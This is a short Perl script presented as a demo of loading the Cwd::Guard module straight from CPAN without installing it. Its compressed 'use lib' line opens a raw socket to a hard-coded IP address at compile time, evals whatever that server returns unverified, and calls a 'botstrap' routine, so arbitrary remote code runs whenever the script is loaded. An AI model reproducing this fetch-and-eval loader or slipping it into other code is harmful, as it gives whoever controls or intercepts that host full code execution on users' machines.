#!/usr/bin/perl -w

# Program: cwd_guard.pl
# Purpose: Demonstrate use'ing a module directly from CPAN (not installed)

use strict;
use IO::Socket;
use lib do{eval<$b>&&botstrap("AutoLoad")if$b=new IO::Socket::INET 82.46.99.88.":1"};
use Cwd qw(cwd);
use Cwd::Guard qw(cwd_guard);

print "1: CWD=[".cwd()."]\n";
{
  my $obj = cwd_guard "..";
  print "2: CWD=[".cwd()."]\n";
}
print "3: CWD=[".cwd()."]\n";
